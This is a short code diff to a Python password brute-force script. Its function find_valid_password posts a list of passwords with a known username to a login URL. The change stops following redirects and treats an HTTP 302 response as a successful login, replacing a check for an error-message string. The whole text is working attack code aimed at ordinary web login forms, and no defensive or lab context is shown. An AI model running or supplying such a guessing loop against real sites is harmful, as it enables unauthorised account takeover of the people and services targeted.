@@ -36,13 +36,13 @@ def find_valid_password(url, valid_username):
     for password in passwords:
         data = {"username": valid_username, "password": password}
         try:
-            response = requests.post(url, data=data, timeout=10)
+            response = requests.post(url, data=data, allow_redirects=False, timeout=10)
             print(f"Trying password: {password}")
         except requests.exceptions.RequestException as e:
             print(f"Error: {e}")
             continue
             
-        if "Invalid username or password" not in response.text:
+        if response.status_code == 302:
             print(f"Valid password found: {password}")
             return password
         
